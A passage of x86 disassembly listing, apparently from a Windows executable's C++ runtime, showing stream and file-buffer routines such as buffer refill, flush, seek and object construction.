  402aac:	83 7e 34 00          	cmpl   $0x0,0x34(%esi)
  402ab0:	74 07                	je     0x402ab9
  402ab2:	e8 1f 00 00 00       	call   0x402ad6
  402ab7:	eb 05                	jmp    0x402abe
  402ab9:	e8 9e 01 00 00       	call   0x402c5c
  402abe:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402ac2:	8b ce                	mov    %esi,%ecx
  402ac4:	e8 da 09 00 00       	call   0x4034a3
  402ac9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402acc:	5e                   	pop    %esi
  402acd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402ad4:	c9                   	leave
  402ad5:	c3                   	ret
  402ad6:	56                   	push   %esi
  402ad7:	8b f1                	mov    %ecx,%esi
  402ad9:	57                   	push   %edi
  402ada:	83 7e 30 ff          	cmpl   $0xffffffff,0x30(%esi)
  402ade:	74 22                	je     0x402b02
  402ae0:	8b 06                	mov    (%esi),%eax
  402ae2:	ff 50 04             	call   *0x4(%eax)
  402ae5:	ff 76 30             	push   0x30(%esi)
  402ae8:	8b f8                	mov    %eax,%edi
  402aea:	e8 d8 13 00 00       	call   0x403ec7
  402aef:	83 f8 ff             	cmp    $0xffffffff,%eax
  402af2:	59                   	pop    %ecx
  402af3:	74 0d                	je     0x402b02
  402af5:	83 ff ff             	cmp    $0xffffffff,%edi
  402af8:	74 08                	je     0x402b02
  402afa:	83 4e 30 ff          	orl    $0xffffffff,0x30(%esi)
  402afe:	8b c6                	mov    %esi,%eax
  402b00:	eb 02                	jmp    0x402b04
  402b02:	33 c0                	xor    %eax,%eax
  402b04:	5f                   	pop    %edi
  402b05:	5e                   	pop    %esi
  402b06:	c3                   	ret
  402b07:	56                   	push   %esi
  402b08:	57                   	push   %edi
  402b09:	8b f1                	mov    %ecx,%esi
  402b0b:	e8 ef 0a 00 00       	call   0x4035ff
  402b10:	83 cf ff             	or     $0xffffffff,%edi
  402b13:	3b c7                	cmp    %edi,%eax
  402b15:	74 5d                	je     0x402b74
  402b17:	8b ce                	mov    %esi,%ecx
  402b19:	e8 3e 01 00 00       	call   0x402c5c
  402b1e:	3b c7                	cmp    %edi,%eax
  402b20:	74 52                	je     0x402b74
  402b22:	8b 4e 08             	mov    0x8(%esi),%ecx
  402b25:	85 c9                	test   %ecx,%ecx
  402b27:	75 0f                	jne    0x402b38
  402b29:	8b 46 10             	mov    0x10(%esi),%eax
  402b2c:	89 46 18             	mov    %eax,0x18(%esi)
  402b2f:	89 46 1c             	mov    %eax,0x1c(%esi)
  402b32:	8b 46 14             	mov    0x14(%esi),%eax
  402b35:	89 46 20             	mov    %eax,0x20(%esi)
  402b38:	39 7c 24 0c          	cmp    %edi,0xc(%esp)
  402b3c:	74 17                	je     0x402b55
  402b3e:	85 c9                	test   %ecx,%ecx
  402b40:	75 1b                	jne    0x402b5d
  402b42:	8b 46 1c             	mov    0x1c(%esi),%eax
  402b45:	3b 46 20             	cmp    0x20(%esi),%eax
  402b48:	73 13                	jae    0x402b5d
  402b4a:	ff 74 24 0c          	push   0xc(%esp)
  402b4e:	8b ce                	mov    %esi,%ecx
  402b50:	e8 00 fe ff ff       	call   0x402955
  402b55:	6a 01                	push   $0x1
  402b57:	58                   	pop    %eax
  402b58:	5f                   	pop    %edi
  402b59:	5e                   	pop    %esi
  402b5a:	c2 04 00             	ret    $0x4
  402b5d:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402b61:	6a 01                	push   $0x1
  402b63:	50                   	push   %eax
  402b64:	ff 76 30             	push   0x30(%esi)
  402b67:	e8 0e 14 00 00       	call   0x403f7a
  402b6c:	83 c4 0c             	add    $0xc,%esp
  402b6f:	83 f8 01             	cmp    $0x1,%eax
  402b72:	74 e1                	je     0x402b55
  402b74:	8b c7                	mov    %edi,%eax
  402b76:	eb e0                	jmp    0x402b58
  402b78:	55                   	push   %ebp
  402b79:	8b ec                	mov    %esp,%ebp
  402b7b:	51                   	push   %ecx
  402b7c:	56                   	push   %esi
  402b7d:	57                   	push   %edi
  402b7e:	8b f1                	mov    %ecx,%esi
  402b80:	e8 83 00 00 00       	call   0x402c08
  402b85:	85 c0                	test   %eax,%eax
  402b87:	74 08                	je     0x402b91
  402b89:	8b 46 28             	mov    0x28(%esi),%eax
  402b8c:	0f b6 00             	movzbl (%eax),%eax
  402b8f:	eb 73                	jmp    0x402c04
  402b91:	8b ce                	mov    %esi,%ecx
  402b93:	e8 67 0a 00 00       	call   0x4035ff
  402b98:	83 cf ff             	or     $0xffffffff,%edi
  402b9b:	3b c7                	cmp    %edi,%eax
  402b9d:	74 4d                	je     0x402bec
  402b9f:	8b ce                	mov    %esi,%ecx
  402ba1:	e8 b6 00 00 00       	call   0x402c5c
  402ba6:	3b c7                	cmp    %edi,%eax
  402ba8:	74 42                	je     0x402bec
  402baa:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  402bae:	74 1b                	je     0x402bcb
  402bb0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402bb3:	6a 01                	push   $0x1
  402bb5:	50                   	push   %eax
  402bb6:	ff 76 30             	push   0x30(%esi)
  402bb9:	e8 69 15 00 00       	call   0x404127
  402bbe:	83 c4 0c             	add    $0xc,%esp
  402bc1:	85 c0                	test   %eax,%eax
  402bc3:	7e 27                	jle    0x402bec
  402bc5:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  402bc9:	eb 39                	jmp    0x402c04
  402bcb:	8b 46 14             	mov    0x14(%esi),%eax
  402bce:	8b 4e 10             	mov    0x10(%esi),%ecx
  402bd1:	3b c1                	cmp    %ecx,%eax
  402bd3:	76 04                	jbe    0x402bd9
  402bd5:	2b c1                	sub    %ecx,%eax
  402bd7:	eb 02                	jmp    0x402bdb
  402bd9:	33 c0                	xor    %eax,%eax
  402bdb:	50                   	push   %eax
  402bdc:	51                   	push   %ecx
  402bdd:	ff 76 30             	push   0x30(%esi)
  402be0:	e8 42 15 00 00       	call   0x404127
  402be5:	83 c4 0c             	add    $0xc,%esp
  402be8:	85 c0                	test   %eax,%eax
  402bea:	7f 04                	jg     0x402bf0
  402bec:	8b c7                	mov    %edi,%eax
  402bee:	eb 14                	jmp    0x402c04
  402bf0:	8b 4e 10             	mov    0x10(%esi),%ecx
  402bf3:	89 7e 0c             	mov    %edi,0xc(%esi)
  402bf6:	03 c1                	add    %ecx,%eax
  402bf8:	89 4e 24             	mov    %ecx,0x24(%esi)
  402bfb:	89 4e 28             	mov    %ecx,0x28(%esi)
  402bfe:	89 46 2c             	mov    %eax,0x2c(%esi)
  402c01:	0f b6 01             	movzbl (%ecx),%eax
  402c04:	5f                   	pop    %edi
  402c05:	5e                   	pop    %esi
  402c06:	c9                   	leave
  402c07:	c3                   	ret
  402c08:	8b 51 28             	mov    0x28(%ecx),%edx
  402c0b:	8b 41 2c             	mov    0x2c(%ecx),%eax
  402c0e:	3b d0                	cmp    %eax,%edx
  402c10:	73 03                	jae    0x402c15
  402c12:	2b c2                	sub    %edx,%eax
  402c14:	c3                   	ret
  402c15:	33 c0                	xor    %eax,%eax
  402c17:	c3                   	ret
  402c18:	8b 44 24 08          	mov    0x8(%esp),%eax
  402c1c:	53                   	push   %ebx
  402c1d:	33 db                	xor    %ebx,%ebx
  402c1f:	56                   	push   %esi
  402c20:	2b c3                	sub    %ebx,%eax
  402c22:	8b f1                	mov    %ecx,%esi
  402c24:	74 0d                	je     0x402c33
  402c26:	48                   	dec    %eax
  402c27:	74 07                	je     0x402c30
  402c29:	48                   	dec    %eax
  402c2a:	75 28                	jne    0x402c54
  402c2c:	6a 02                	push   $0x2
  402c2e:	eb 02                	jmp    0x402c32
  402c30:	6a 01                	push   $0x1
  402c32:	5b                   	pop    %ebx
  402c33:	8b ce                	mov    %esi,%ecx
  402c35:	e8 22 00 00 00       	call   0x402c5c
  402c3a:	83 f8 ff             	cmp    $0xffffffff,%eax
  402c3d:	74 15                	je     0x402c54
  402c3f:	53                   	push   %ebx
  402c40:	ff 74 24 10          	push   0x10(%esp)
  402c44:	ff 76 30             	push   0x30(%esi)
  402c47:	e8 d1 16 00 00       	call   0x40431d
  402c4c:	83 c4 0c             	add    $0xc,%esp
  402c4f:	83 f8 ff             	cmp    $0xffffffff,%eax
  402c52:	75 03                	jne    0x402c57
  402c54:	83 c8 ff             	or     $0xffffffff,%eax
  402c57:	5e                   	pop    %esi
  402c58:	5b                   	pop    %ebx
  402c59:	c2 0c 00             	ret    $0xc
  402c5c:	53                   	push   %ebx
  402c5d:	56                   	push   %esi
  402c5e:	8b f1                	mov    %ecx,%esi
  402c60:	83 c8 ff             	or     $0xffffffff,%eax
  402c63:	57                   	push   %edi
  402c64:	8b 4e 30             	mov    0x30(%esi),%ecx
  402c67:	3b c8                	cmp    %eax,%ecx
  402c69:	0f 84 c1 00 00 00    	je     0x402d30
  402c6f:	33 db                	xor    %ebx,%ebx
  402c71:	39 5e 08             	cmp    %ebx,0x8(%esi)
  402c74:	0f 85 b4 00 00 00    	jne    0x402d2e
  402c7a:	8b 7e 1c             	mov    0x1c(%esi),%edi
  402c7d:	8b 46 18             	mov    0x18(%esi),%eax
  402c80:	3b f8                	cmp    %eax,%edi
  402c82:	72 04                	jb     0x402c88
  402c84:	2b f8                	sub    %eax,%edi
  402c86:	eb 02                	jmp    0x402c8a
  402c88:	33 ff                	xor    %edi,%edi
  402c8a:	3b fb                	cmp    %ebx,%edi
  402c8c:	74 2f                	je     0x402cbd
  402c8e:	57                   	push   %edi
  402c8f:	50                   	push   %eax
  402c90:	51                   	push   %ecx
  402c91:	e8 e4 12 00 00       	call   0x403f7a
  402c96:	83 c4 0c             	add    $0xc,%esp
  402c99:	3b c7                	cmp    %edi,%eax
  402c9b:	74 20                	je     0x402cbd
  402c9d:	3b c3                	cmp    %ebx,%eax
  402c9f:	7e 79                	jle    0x402d1a
  402ca1:	39 5e 20             	cmp    %ebx,0x20(%esi)
  402ca4:	74 03                	je     0x402ca9
  402ca6:	29 46 1c             	sub    %eax,0x1c(%esi)
  402ca9:	8b 76 18             	mov    0x18(%esi),%esi
  402cac:	2b f8                	sub    %eax,%edi
  402cae:	03 c6                	add    %esi,%eax
  402cb0:	57                   	push   %edi
  402cb1:	50                   	push   %eax
  402cb2:	56                   	push   %esi
  402cb3:	e8 b8 18 00 00       	call   0x404570
  402cb8:	83 c4 0c             	add    $0xc,%esp
  402cbb:	eb 5d                	jmp    0x402d1a
  402cbd:	8b ce                	mov    %esi,%ecx
  402cbf:	89 5e 18             	mov    %ebx,0x18(%esi)
  402cc2:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  402cc5:	89 5e 20             	mov    %ebx,0x20(%esi)
  402cc8:	e8 3b ff ff ff       	call   0x402c08
  402ccd:	3b c3                	cmp    %ebx,%eax
  402ccf:	7e 50                	jle    0x402d21
  402cd1:	8b 7e 30             	mov    0x30(%esi),%edi
  402cd4:	8b cf                	mov    %edi,%ecx
  402cd6:	8b d7                	mov    %edi,%edx
  402cd8:	c1 f9 05             	sar    $0x5,%ecx
  402cdb:	83 e2 1f             	and    $0x1f,%edx
  402cde:	8b 0c 8d 20 d4 40 00 	mov    0x40d420(,%ecx,4),%ecx
  402ce5:	8a 5c d1 04          	mov    0x4(%ecx,%edx,8),%bl
  402ce9:	f6 c3 80             	test   $0x80,%bl
  402cec:	74 19                	je     0x402d07
  402cee:	8b 4e 28             	mov    0x28(%esi),%ecx
  402cf1:	8b 56 2c             	mov    0x2c(%esi),%edx
  402cf4:	3b ca                	cmp    %edx,%ecx
  402cf6:	73 09                	jae    0x402d01
  402cf8:	80 39 0a             	cmpb   $0xa,(%ecx)
  402cfb:	75 01                	jne    0x402cfe
  402cfd:	40                   	inc    %eax
  402cfe:	41                   	inc    %ecx
  402cff:	eb f3                	jmp    0x402cf4
  402d01:	f6 c3 02             	test   $0x2,%bl
  402d04:	74 01                	je     0x402d07
  402d06:	40                   	inc    %eax
  402d07:	f7 d8                	neg    %eax
  402d09:	6a 01                	push   $0x1
  402d0b:	50                   	push   %eax
  402d0c:	57                   	push   %edi
  402d0d:	e8 0b 16 00 00       	call   0x40431d
  402d12:	83 c4 0c             	add    $0xc,%esp
  402d15:	83 f8 ff             	cmp    $0xffffffff,%eax
  402d18:	75 05                	jne    0x402d1f
  402d1a:	83 c8 ff             	or     $0xffffffff,%eax
  402d1d:	eb 11                	jmp    0x402d30
  402d1f:	33 db                	xor    %ebx,%ebx
  402d21:	83 4e 0c ff          	orl    $0xffffffff,0xc(%esi)
  402d25:	89 5e 24             	mov    %ebx,0x24(%esi)
  402d28:	89 5e 28             	mov    %ebx,0x28(%esi)
  402d2b:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  402d2e:	33 c0                	xor    %eax,%eax
  402d30:	5f                   	pop    %edi
  402d31:	5e                   	pop    %esi
  402d32:	5b                   	pop    %ebx
  402d33:	c3                   	ret
  402d34:	56                   	push   %esi
  402d35:	8b f1                	mov    %ecx,%esi
  402d37:	83 7e 30 ff          	cmpl   $0xffffffff,0x30(%esi)
  402d3b:	74 0a                	je     0x402d47
  402d3d:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  402d41:	74 04                	je     0x402d47
  402d43:	33 c0                	xor    %eax,%eax
  402d45:	eb 28                	jmp    0x402d6f
  402d47:	8b 44 24 08          	mov    0x8(%esp),%eax
  402d4b:	85 c0                	test   %eax,%eax
  402d4d:	74 17                	je     0x402d66
  402d4f:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402d53:	85 c9                	test   %ecx,%ecx
  402d55:	7e 0f                	jle    0x402d66
  402d57:	03 c8                	add    %eax,%ecx
  402d59:	6a 00                	push   $0x0
  402d5b:	51                   	push   %ecx
  402d5c:	50                   	push   %eax
  402d5d:	8b ce                	mov    %esi,%ecx
  402d5f:	e8 e6 08 00 00       	call   0x40364a
  402d64:	eb 07                	jmp    0x402d6d
  402d66:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  402d6d:	8b c6                	mov    %esi,%eax
  402d6f:	5e                   	pop    %esi
  402d70:	c2 08 00             	ret    $0x8
  402d73:	56                   	push   %esi
  402d74:	8b f1                	mov    %ecx,%esi
  402d76:	6a 02                	push   $0x2
  402d78:	8b 06                	mov    (%esi),%eax
  402d7a:	ff 74 24 10          	push   0x10(%esp)
  402d7e:	8b 40 04             	mov    0x4(%eax),%eax
  402d81:	ff 74 24 10          	push   0x10(%esp)
  402d85:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402d89:	8b 01                	mov    (%ecx),%eax
  402d8b:	ff 50 0c             	call   *0xc(%eax)
  402d8e:	83 f8 ff             	cmp    $0xffffffff,%eax
  402d91:	75 0e                	jne    0x402da1
  402d93:	8b 06                	mov    (%esi),%eax
  402d95:	8b 40 04             	mov    0x4(%eax),%eax
  402d98:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  402d9d:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  402da1:	8b c6                	mov    %esi,%eax
  402da3:	5e                   	pop    %esi
  402da4:	c2 08 00             	ret    $0x8
  402da7:	56                   	push   %esi
  402da8:	8d 71 ec             	lea    -0x14(%ecx),%esi
  402dab:	57                   	push   %edi
  402dac:	8d 7e 14             	lea    0x14(%esi),%edi
  402daf:	8b cf                	mov    %edi,%ecx
  402db1:	e8 e5 00 00 00       	call   0x402e9b
  402db6:	8b cf                	mov    %edi,%ecx
  402db8:	e8 83 01 00 00       	call   0x402f40
  402dbd:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  402dc2:	74 07                	je     0x402dcb
  402dc4:	56                   	push   %esi
  402dc5:	e8 8f 0b 00 00       	call   0x403959
  402dca:	59                   	pop    %ecx
  402dcb:	8b c6                	mov    %esi,%eax
  402dcd:	5f                   	pop    %edi
  402dce:	5e                   	pop    %esi
  402dcf:	c2 04 00             	ret    $0x4
  402dd2:	b8 d3 81 40 00       	mov    $0x4081d3,%eax
  402dd7:	e8 5c 0f 00 00       	call   0x403d38
  402ddc:	51                   	push   %ecx
  402ddd:	51                   	push   %ecx
  402dde:	53                   	push   %ebx
  402ddf:	56                   	push   %esi
  402de0:	57                   	push   %edi
  402de1:	33 db                	xor    %ebx,%ebx
  402de3:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  402de6:	8b f1                	mov    %ecx,%esi
  402de8:	6a 01                	push   $0x1
  402dea:	89 75 ec             	mov    %esi,-0x14(%ebp)
  402ded:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402df0:	5f                   	pop    %edi
  402df1:	74 1b                	je     0x402e0e
  402df3:	8d 4e 14             	lea    0x14(%esi),%ecx
  402df6:	c7 06 98 91 40 00    	movl   $0x409198,(%esi)
  402dfc:	c7 46 0c 90 91 40 00 	movl   $0x409190,0xc(%esi)
  402e03:	e8 ea 00 00 00       	call   0x402ef2
  402e08:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402e0b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402e0e:	6a 38                	push   $0x38
  402e10:	e8 36 0b 00 00       	call   0x40394b
  402e15:	59                   	pop    %ecx
  402e16:	8b c8                	mov    %eax,%ecx
  402e18:	89 4d 14             	mov    %ecx,0x14(%ebp)
  402e1b:	3b cb                	cmp    %ebx,%ecx
  402e1d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402e20:	74 07                	je     0x402e29
  402e22:	e8 34 fc ff ff       	call   0x402a5b
  402e27:	eb 02                	jmp    0x402e2b
  402e29:	33 c0                	xor    %eax,%eax
  402e2b:	53                   	push   %ebx
  402e2c:	50                   	push   %eax
  402e2d:	8b ce                	mov    %esi,%ecx
  402e2f:	88 5d fc             	mov    %bl,-0x4(%ebp)
  402e32:	e8 e2 08 00 00       	call   0x403719
  402e37:	8b 06                	mov    (%esi),%eax
  402e39:	6a 02                	push   $0x2
  402e3b:	5b                   	pop    %ebx
  402e3c:	8b 40 04             	mov    0x4(%eax),%eax
  402e3f:	ff 75 10             	push   0x10(%ebp)
  402e42:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402e45:	c7 04 30 8c 91 40 00 	movl   $0x40918c,(%eax,%esi,1)
  402e4c:	8b 06                	mov    (%esi),%eax
  402e4e:	ff 75 0c             	push   0xc(%ebp)
  402e51:	8b 40 04             	mov    0x4(%eax),%eax
  402e54:	ff 75 08             	push   0x8(%ebp)
  402e57:	89 7c 30 1c          	mov    %edi,0x1c(%eax,%esi,1)
  402e5b:	8b 06                	mov    (%esi),%eax
  402e5d:	8b 40 04             	mov    0x4(%eax),%eax
  402e60:	89 7c 30 1c          	mov    %edi,0x1c(%eax,%esi,1)
  402e64:	8b 06                	mov    (%esi),%eax
  402e66:	8b 40 04             	mov    0x4(%eax),%eax
  402e69:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402e6d:	e8 96 02 00 00       	call   0x403108
  402e72:	85 c0                	test   %eax,%eax
  402e74:	75 12                	jne    0x402e88
  402e76:	8b 06                	mov    (%esi),%eax
  402e78:	8b 40 04             	mov    0x4(%eax),%eax
  402e7b:	89 5c 30 08          	mov    %ebx,0x8(%eax,%esi,1)
  402e7f:	8b 06                	mov    (%esi),%eax
  402e81:	8b 40 04             	mov    0x4(%eax),%eax
  402e84:	89 5c 30 08          	mov    %ebx,0x8(%eax,%esi,1)
  402e88:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e8b:	8b c6                	mov    %esi,%eax
  402e8d:	5f                   	pop    %edi
  402e8e:	5e                   	pop    %esi
  402e8f:	5b                   	pop    %ebx
  402e90:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e97:	c9                   	leave
  402e98:	c2 10 00             	ret    $0x10
  402e9b:	8b 41 ec             	mov    -0x14(%ecx),%eax
  402e9e:	8b 40 04             	mov    0x4(%eax),%eax
  402ea1:	c7 44 08 ec 8c 91 40 	movl   $0x40918c,-0x14(%eax,%ecx,1)
  402ea8:	00 
  402ea9:	e9 e0 08 00 00       	jmp    0x40378e
  402eae:	56                   	push   %esi
  402eaf:	8b f1                	mov    %ecx,%esi
  402eb1:	8b 06                	mov    (%esi),%eax
  402eb3:	8b 40 04             	mov    0x4(%eax),%eax
  402eb6:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402eba:	e8 17 fc ff ff       	call   0x402ad6
  402ebf:	85 c0                	test   %eax,%eax
  402ec1:	8b 06                	mov    (%esi),%eax
  402ec3:	8b 40 04             	mov    0x4(%eax),%eax
  402ec6:	74 11                	je     0x402ed9
  402ec8:	83 64 30 08 00       	andl   $0x0,0x8(%eax,%esi,1)
  402ecd:	8b 06                	mov    (%esi),%eax
  402ecf:	8b 40 04             	mov    0x4(%eax),%eax
  402ed2:	83 64 30 08 00       	andl   $0x0,0x8(%eax,%esi,1)
  402ed7:	5e                   	pop    %esi
  402ed8:	c3                   	ret
  402ed9:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  402ede:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  402ee2:	8b 06                	mov    (%esi),%eax
  402ee4:	8b 40 04             	mov    0x4(%eax),%eax
  402ee7:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  402eec:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  402ef0:	5e                   	pop    %esi
  402ef1:	c3                   	ret
  402ef2:	8b c1                	mov    %ecx,%eax
  402ef4:	33 c9                	xor    %ecx,%ecx
  402ef6:	c7 00 b0 91 40 00    	movl   $0x4091b0,(%eax)
  402efc:	89 48 04             	mov    %ecx,0x4(%eax)
  402eff:	c7 40 08 04 00 00 00 	movl   $0x4,0x8(%eax)
  402f06:	89 48 0c             	mov    %ecx,0xc(%eax)
  402f09:	89 48 10             	mov    %ecx,0x10(%eax)
  402f0c:	89 48 20             	mov    %ecx,0x20(%eax)
  402f0f:	89 48 24             	mov    %ecx,0x24(%eax)
  402f12:	c7 40 28 06 00 00 00 	movl   $0x6,0x28(%eax)
  402f19:	c6 40 2c 20          	movb   $0x20,0x2c(%eax)
  402f1d:	89 48 30             	mov    %ecx,0x30(%eax)
  402f20:	89 48 1c             	mov    %ecx,0x1c(%eax)
  402f23:	c3                   	ret
  402f24:	56                   	push   %esi
  402f25:	8b f1                	mov    %ecx,%esi
  402f27:	e8 14 00 00 00       	call   0x402f40
  402f2c:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402f31:	74 07                	je     0x402f3a
  402f33:	56                   	push   %esi
  402f34:	e8 20 0a 00 00       	call   0x403959
  402f39:	59                   	pop    %ecx
  402f3a:	8b c6                	mov    %esi,%eax
  402f3c:	5e                   	pop    %esi
  402f3d:	c2 04 00             	ret    $0x4
  402f40:	56                   	push   %esi
  402f41:	8b f1                	mov    %ecx,%esi
  402f43:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  402f47:	c7 06 b0 91 40 00    	movl   $0x4091b0,(%esi)
  402f4d:	74 0d                	je     0x402f5c
  402f4f:	8b 4e 04             	mov    0x4(%esi),%ecx
  402f52:	85 c9                	test   %ecx,%ecx
  402f54:	74 06                	je     0x402f5c
  402f56:	8b 01                	mov    (%ecx),%eax
  402f58:	6a 01                	push   $0x1
  402f5a:	ff 10                	call   *(%eax)
  402f5c:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402f60:	c7 46 08 04 00 00 00 	movl   $0x4,0x8(%esi)
  402f67:	5e                   	pop    %esi
  402f68:	c3                   	ret
  402f69:	56                   	push   %esi
  402f6a:	8b f1                	mov    %ecx,%esi
  402f6c:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  402f70:	74 0d                	je     0x402f7f
  402f72:	8b 4e 04             	mov    0x4(%esi),%ecx
  402f75:	85 c9                	test   %ecx,%ecx
  402f77:	74 06                	je     0x402f7f
  402f79:	8b 01                	mov    (%ecx),%eax
  402f7b:	6a 01                	push   $0x1
  402f7d:	ff 10                	call   *(%eax)
  402f7f:	8b 44 24 08          	mov    0x8(%esp),%eax
  402f83:	85 c0                	test   %eax,%eax
  402f85:	89 46 04             	mov    %eax,0x4(%esi)
  402f88:	74 06                	je     0x402f90
  402f8a:	83 66 08 fb          	andl   $0xfffffffb,0x8(%esi)
  402f8e:	eb 04                	jmp    0x402f94
  402f90:	83 4e 08 04          	orl    $0x4,0x8(%esi)
  402f94:	5e                   	pop    %esi
  402f95:	c2 04 00             	ret    $0x4
  402f98:	8b 01                	mov    (%ecx),%eax
  402f9a:	8b 40 04             	mov    0x4(%eax),%eax
  402f9d:	03 c1                	add    %ecx,%eax
  402f9f:	8b 48 08             	mov    0x8(%eax),%ecx
  402fa2:	85 c9                	test   %ecx,%ecx
  402fa4:	74 09                	je     0x402faf
  402fa6:	83 c9 02             	or     $0x2,%ecx
  402fa9:	89 48 08             	mov    %ecx,0x8(%eax)
  402fac:	33 c0                	xor    %eax,%eax
  402fae:	c3                   	ret
  402faf:	8b 40 20             	mov    0x20(%eax),%eax
  402fb2:	85 c0                	test   %eax,%eax
  402fb4:	74 07                	je     0x402fbd
  402fb6:	8b c8                	mov    %eax,%ecx
  402fb8:	e8 84 00 00 00       	call   0x403041
  402fbd:	6a 01                	push   $0x1
  402fbf:	58                   	pop    %eax
  402fc0:	c3                   	ret
  402fc1:	56                   	push   %esi
  402fc2:	8b f1                	mov    %ecx,%esi
  402fc4:	8b 06                	mov    (%esi),%eax
  402fc6:	8b 40 04             	mov    0x4(%eax),%eax
  402fc9:	83 64 30 30 00       	andl   $0x0,0x30(%eax,%esi,1)
  402fce:	8b 06                	mov    (%esi),%eax
  402fd0:	8b 40 04             	mov    0x4(%eax),%eax
  402fd3:	03 c6                	add    %esi,%eax
  402fd5:	f6 40 25 20          	testb  $0x20,0x25(%eax)
  402fd9:	74 1c                	je     0x402ff7
  402fdb:	8b 40 04             	mov    0x4(%eax),%eax
  402fde:	8b c8                	mov    %eax,%ecx
  402fe0:	8b 10                	mov    (%eax),%edx
  402fe2:	ff 52 04             	call   *0x4(%edx)
  402fe5:	83 f8 ff             	cmp    $0xffffffff,%eax
  402fe8:	75 0d                	jne    0x402ff7
  402fea:	8b 06                	mov    (%esi),%eax
  402fec:	8b 40 04             	mov    0x4(%eax),%eax
  402fef:	c7 44 30 08 06 00 00 	movl   $0x6,0x8(%eax,%esi,1)
  402ff6:	00 
  402ff7:	8b 06                	mov    (%esi),%eax
  402ff9:	8b 40 04             	mov    0x4(%eax),%eax
  402ffc:	f6 44 30 25 40       	testb  $0x40,0x25(%eax,%esi,1)
  403001:	74 3c                	je     0x40303f
  403003:	68 80 b7 40 00       	push   $0x40b780
  403008:	e8 98 18 00 00       	call   0x4048a5
  40300d:	83 f8 ff             	cmp    $0xffffffff,%eax
  403010:	59                   	pop    %ecx
  403011:	75 0e                	jne    0x403021
  403013:	8b 06                	mov    (%esi),%eax
  403015:	8b 40 04             	mov    0x4(%eax),%eax
  403018:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  40301d:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  403021:	68 a0 b7 40 00       	push   $0x40b7a0
  403026:	e8 7a 18 00 00       	call   0x4048a5
  40302b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40302e:	59                   	pop    %ecx
  40302f:	75 0e                	jne    0x40303f
  403031:	8b 06                	mov    (%esi),%eax
  403033:	8b 40 04             	mov    0x4(%eax),%eax
  403036:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  40303b:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  40303f:	5e                   	pop    %esi
  403040:	c3                   	ret
  403041:	56                   	push   %esi
  403042:	8b f1                	mov    %ecx,%esi
  403044:	8b 06                	mov    (%esi),%eax
  403046:	8b 40 04             	mov    0x4(%eax),%eax
  403049:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  40304d:	8b 01                	mov    (%ecx),%eax
  40304f:	ff 50 04             	call   *0x4(%eax)
  403052:	83 f8 ff             	cmp    $0xffffffff,%eax
  403055:	75 0e                	jne    0x403065
  403057:	8b 06                	mov    (%esi),%eax
  403059:	8b 40 04             	mov    0x4(%eax),%eax
  40305c:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  403061:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  403065:	8b c6                	mov    %esi,%eax
  403067:	5e                   	pop    %esi
  403068:	c3                   	ret
  403069:	56                   	push   %esi
  40306a:	8d 71 f8             	lea    -0x8(%ecx),%esi
  40306d:	57                   	push   %edi
  40306e:	8d 7e 08             	lea    0x8(%esi),%edi
  403071:	8b cf                	mov    %edi,%ecx
  403073:	e8 81 00 00 00       	call   0x4030f9
  403078:	8b cf                	mov    %edi,%ecx
  40307a:	e8 c1 fe ff ff       	call   0x402f40
  40307f:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  403084:	74 07                	je     0x40308d
  403086:	56                   	push   %esi
  403087:	e8 cd 08 00 00       	call   0x403959
  40308c:	59                   	pop    %ecx
  40308d:	8b c6                	mov    %esi,%eax
  40308f:	5f                   	pop    %edi
  403090:	5e                   	pop    %esi
  403091:	c2 04 00             	ret    $0x4
  403094:	b8 fa 81 40 00       	mov    $0x4081fa,%eax
  403099:	e8 9a 0c 00 00       	call   0x403d38
  40309e:	51                   	push   %ecx
  40309f:	51                   	push   %ecx
  4030a0:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  4030a4:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4030a8:	56                   	push   %esi
  4030a9:	8b f1                	mov    %ecx,%esi
  4030ab:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4030ae:	74 19                	je     0x4030c9
